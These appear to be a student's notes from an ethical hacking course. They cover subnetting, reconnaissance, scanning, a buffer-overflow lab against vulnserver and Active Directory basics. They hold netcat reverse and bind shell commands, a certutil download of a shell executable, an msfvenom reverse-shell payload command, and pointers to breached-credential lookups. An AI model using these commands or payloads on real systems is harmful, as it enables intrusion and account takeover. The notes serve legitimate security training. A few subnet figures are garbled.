PEH - TCM

recs - https://github.com/Gr1mmie/Practical-Ethical-Hacking-Resources





## Subnetting

128 64 32 16 8 4 2 1    128 64 32 16 8 4 2 1    128 64 32 16 8 4 2 1    128 64 32 16 8 4 2 1
  1  1  1  1 1 1 1 1      1  1  1  1 1 1 1 1      1  1  1  1 1 1 1 1      0  0  0  0 0 0 0 0    /24
                 255                     255                     255                       0
                                                                                                hosts 2^8(no of zeros)
                                                                                                      256


              1   2   3   4   5   6   7   8     255.0.0.0
              9  10  11  12  13  14  15  16     255.255.0.0
             17  18  19  20  21  22  23  24     255.255.255.0
             25  26  27  28  29  30  31  32     
             
hosts       128  64  32  16   8   4   2   1
subnet      128 192 224 240 248 252 254 255


class A     10.0.0.0                    total hosts 16,777,216
class B     172.16.0.0 - 172.31.0.0                 65,536
class C     192.168.0.0 - 192.168                   256
loopback    127.0.0.0 - 127.0.0.7                                                                      


subnet   x.0.0.0
CIDR                   /1             /2           /3           /4           /5          /6         /7          /8
hosts       2,147,483,648  1,073,741,824  536,870,912  268,435,456  134,217,728  67,108,864  33,554,43  16,777,216

subnet   255.x.0.0
CIDR               /9       /10       /11       /12     /13     /14     /15     /16
hosts       8,388,608 4,194,304 2,097,152 1,048,576 524,288 262,144 131,072  65,536

subnet   255.255.x.0
CIDR            /17     /18     /19     /20    /21    /22     /23     /24
hosts       32,768   16,384   8,192   4,096  2,048  1,024     512     256

subnet   255.255.255.x
CIDR        /25  /26  /27  /28  /29  /30  /31  /32
hosts       128   64   32   16    8    4    2    1

subnet mask(replace x) 128  192  224  240  248  252  254  255


eg
                    subnet              hosts   Network         Broadcast
192.168.1.0/24      255.255.255.0       254     192.168.1.0     192.168.1.255
192.168.1.0/28      255.255.255.240     14      192.168.1.0     192.168.1.15
192.168.1.16/28     255.255.255.240     14      192.168.1.16    192.168.1.31
192.168.1.0/23      255.255.254.0       510     192.168.0.0     192.168.1.255
192.168.2.0/23      255.255.254.0       510     192.168.2.0     192.168.3.255

192.168.0.0/22      255.255.252.0     1,022     192.168.0.0     192.168.3.255
192.168.1.0/26      255.255.255.192      62     192.168.1.0     192.168.1.63
192.168.1.0/27      255.255.255.224      30     192.168.1.0     192.168.1.31



Bash
- ipsweep
- for ip in $(cat ip.txt); do nmap $ip; done




Stages
- Recon(active and passive)
- Scanning and enum(nmap,nessus,nikto)
- Gain access(exploitation)
- Maintain access
- Covering tracks(clean up logs,malwares,redo settings,accounts)




#Info Gathering(Passive)
location
employees
web/host - target validation(lookup,dnsrecon)
         - subdomains(bluto,google fu,dig,nmap,sublist3r,crt.sh)
         - fingerprinting(nmap,wapalizer,builtwith,whatweb,netcat)
         - data beaches(haveibeenpawned,breachparse,weleakinfo)
emails - hunter.io
       - phonebook.cz
       - tools.verifyemailaddress.io
       - email-checker.net
Creds  - breachparse.sh @domain.com domain.txt
       - dehashed(subscribe,login) (mk@domain.com mk1234, @domain.com)
       - hashes.com
subdomains - apt install sublist3r/owasp amass
           - crt.sh - certificate fingerprinting(%.domain.com)
           - tomnomnomm httpprobe(liveness of sub)
websites - builtwith.com
         - wappalizer
         - whatweb
         - burp
         - google fu(dorks)
social media
OSINT




#Scanning and enum
kioptrix(vulnhub) john TwoCows2
       - arpscan -l
       - netdiscover
       3 way handshake   - SYN SYNACK ACK
                         - SYN SYNACK RST (nmap -sS)
       - nikto
       - dirb, dirbuster, gobuster, feroxbuster
SMB - 139,445(port TCP/UDP 137 for name services, and port UDP 138 for datagram services)
       - msf
       - smbclient -L \\\\ip\\
SSH    - ssh ip -oKexAlgorithms=+</algo> -c aes128-cbc
Nessus




#Exploitation basics
Reverse shell - victim --> attacker
              nc <victimip> 4444 -e /bin/sh   -->  nc -lnvp 4444
Bind shell - attacker --> victim
              nc <attackerip> 4444  -->  nc -lnvp 4444 -e /bin/sh
Payloads - Staged - sends payload in stages
                  - less stable
                  - windows/meterpreter/reverse_tcp
         - Non-staged - sends shellcode payload at once
                      - large and might fail
                      - windows/meterpreter_reverse_tcp
credential stuffing - inject breached acc creds for acc takeover
password spraying - using known usernames against unknown passwd
       if on AD careful on acc lock out.



#New Capstone
- Download machines for vm
       -Blue, Academy, Dev, Butler, Blackpearl
- Pentesting for noobs HTB series
       - https://www.youtube.com/watch?v=JZN3JhoAdWo&list=PLLKT__MCUeiyxF54dBIkzEXT7h8NgqQUB
ffuf -w wordlistpath:FUZZ -u http://10.10.4.4/FUZZ
certutil.exe -urlcache -f http://serverip/shell.exe shell.exe
dnsrecon -r 127.0.0.0/24 -n myip -d domain



#Exploit Development (Buffer Overflows)
Resources
    - win evaluation 10 enterprise
    - https://www.immunityinc.com/products/debugger/
    - vulnserver on victim machine - http://thegreycorner.com/vulnserver.html
kernel(top) -> stack -> heap -> Data -> Text(bottom)
Stack
    - Extended Stack Pointer(ESP)(top)
    - Buffer Space
    - Extended Base Pointer(EBP)(bottom)
    - Extended Instruction Pointer(EIP)/Return Address
Overload buffer space to EIP.
Steps
    - Spiking - find vuln part
    - Fuzzing - send xxcters to break
    - Find offset - where program breaks
    - Overwrite EIP - overwrite pointer address
    - Find bad xxcters
    - Find the right module
    - Generate shellcode(point EIP to shellcode)
    - Be root
    
vulnserver and immunity as admin.
attach process, play
kali    - nc -nv 192.168.1.100 9999

       #spiking
        - pluma stats.spk
                s_readline();
                s_string("STATS ");
                s_string_variable("0");
        - generic_send_tcp 192.168.1.100 9999 stats.spk 0 0

        #fuzzing 
        - pluma trun.spk
              s_readline();
              s_string("TRUN ");
              s_string_variable("0");
        - generic_send_tcp 192.168.1.100 9999 trun.spk 0 0

        #find offset
        /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
        /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2000 -q 386F4337(EIP addr)

        #find bad chars
        https://github.com/cytopia/badchars
        follow in dump and check missing seq nums
        in successive seq assume first char as bad

        #find right module - some dll without memory protection(no death, aslr, safeseh)
        https://github.com/corelan/mona
        mona.py in pycommands folder(immunity debugger)
        opcode equiv (nasm_shell)
        /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
            JMP ESP
        !mona find -s "\xff\xe4" -m essfunc.dll
        
        #gen shellcode and get root
        msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"



#Active Directory Overview
manage windows domain networks
stores info of objs - commp, users, printers...
Kerberos authentication
non windwos devices(authentication) - RADIUS, LDAP
Abuse features, trusts, components, policies...

Physical AD components
DC - server with AD DS role promoted to DC
   - host AD DS directory store
   - authentication and authorization
   - Replicate updates to other DCs in the domain and forest
   - manage user accouts and network resources
AD DS Data store - database files and processes that store and manage directory info for users, services, and apps.
                 - has Ntds.dit file
                 - default folder %SystemRoot%\NTDS on all DCs
                 - accessible only thru DC processes and protocols

Logical AD components
AD DS Schema - defines objects
             - enfoce rules on obj creation and config
Domains - group and manage objs
        - administrative boundary for replicating applying policies to groups of objs
        - replication boundary for replicating data btn DCs
        - authentication and authorization boundary that provides a way to limit scope of access to resources
Trees - Hierarchy of domains in AD DS
      - share contiguous namespace with parent domain
      - Can have additional domains
      - By default creates a two-way transitive trust with other domains
Forests - collection of domain trees
        - common schema
        - common config partition
        - common global catalog to enable searching
        - enable trusts btn domains in the forest
        - share enterprise admins and schema admins groups
Organizational Units(OUs) - AD containers with users, groups, comps and other OUs
                          - Rep org hierarchically and logically
                          - manage collection of objs consistently
                          - delegate permission to administer groups of objs
                          - apply policies
Trusts - mechanisms for users to gain access to recs in another domain
       - Directional - trust direction from trusting domain to trusted domain
       - Transitive - trust beyond two-domain trust to other trusted domains
       - all domains in a forest trust other doamins in the forest
       - trusts can extend outside the forest
Objects - User - enables net recs access for user
        - InetOrgPerson - similar to user acc
                        - for compatibility with other directory services
        - Contacts - assign emails to external users
                   - does not enable network access
        - Groups - simplify administration of access control
        - Comps- enable authentication and auditing of comp access to recs
        - Printers - simplify location and connection to printers
        - Shared folders - enables users search for shared folders based on properties



#AD lab


























